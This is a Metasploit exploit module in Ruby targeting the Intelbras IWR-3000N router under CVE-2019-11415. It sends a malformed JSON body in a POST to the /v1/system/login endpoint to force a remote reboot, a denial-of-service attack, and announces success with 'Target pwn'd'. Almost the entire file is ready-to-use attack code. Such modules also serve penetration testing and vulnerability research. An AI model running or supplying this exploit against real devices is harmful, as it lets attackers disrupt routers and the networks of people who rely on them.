require 'msf/core'

class MetasploitModule < Msf::Exploit
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Intelbras IWR-3000N Remote Reboot (CVE-2019-11415)',
      'Description'     => %q{
        This module sends a malformed POST request to /v1/system/login to force a remote reboot (DoS).
      },
      'Author'          => 
        [
          'RGFulw' #Module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['CVE', '2019-11415'],
          ['EDB', '46768']
        ],
      'DisclosureDate'  => 'Apr 30 2019',
    ))

    register_options([
      OptString.new('RHOST', [ true, 'Remote host', '' ]),
      OptInt.new('RPORT', [ true, 'Remote port', 8080 ]),
      OptString.new('URI', [ true, 'Path to POST to', '/v1/system/login' ])
    ])
  end

  def run
    print_status("Sending malformed POST to #{rhost}:#{rport}#{datastore['URI']} to force reboot...")
    begin
      res = send_request_raw({
        'uri'    => '/v1/system/login',
        'method' => 'POST',
        'data'   => '\""}',
        'headers' => { 'Content-Type' => 'application/json' }
      })

      if res && res.code == 200
        print_good("Malformed request sent. Target pwn'd.")
      else
        print_error("Unexpected response or target up.")
      end
    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} - Failed connecting to the web server.")
    end
  end
end
